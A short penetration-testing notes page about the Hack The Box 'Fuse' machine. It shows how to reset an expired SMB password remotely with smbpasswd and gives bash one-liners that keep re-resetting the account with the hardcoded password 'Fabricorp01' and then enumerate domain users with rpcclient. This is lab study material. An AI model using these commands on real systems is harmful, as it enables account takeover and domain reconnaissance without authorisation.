# Copy of SMBPass Change

If for some reason we have the same case that happened in Fuse where we sprayed the passwords and it was valid but we needed to change the password to a new one.&#x20;

We can change it using the following command:

```
root@kali# smbpasswd -r 10.10.10.193 bhult
Old SMB password:
New SMB password:
Retype new SMB password:                                   
Password changed for user bhult on 10.10.10.193.
```

From here rerun your enumeration.

Script if the password changes every minute; refer to the Fuse Box.

```
if echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi; 
```

After the fi; we can query any command we want as such.

```
f echo "$pass" | smbclient -L //10.10.10.193 -U bhult 2>/dev/null >/dev/null; then echo "Password $pass still good"; else pass=$(date +%s | md5sum | base64 | head -c7; echo .); (echo 'Fabricorp01'; echo "$pass"; echo "$pass";) | smbpasswd -r 10.10.10.193 -s bhult; echo "password reset to $pass"; fi; rpcclient -U "bhult%${pass}" 10.10.10.193 -c "enumdomusers" | grep -oP '\[.*?\]'| grep "0x" -v | tr -d '[]' > userlist.txt
```
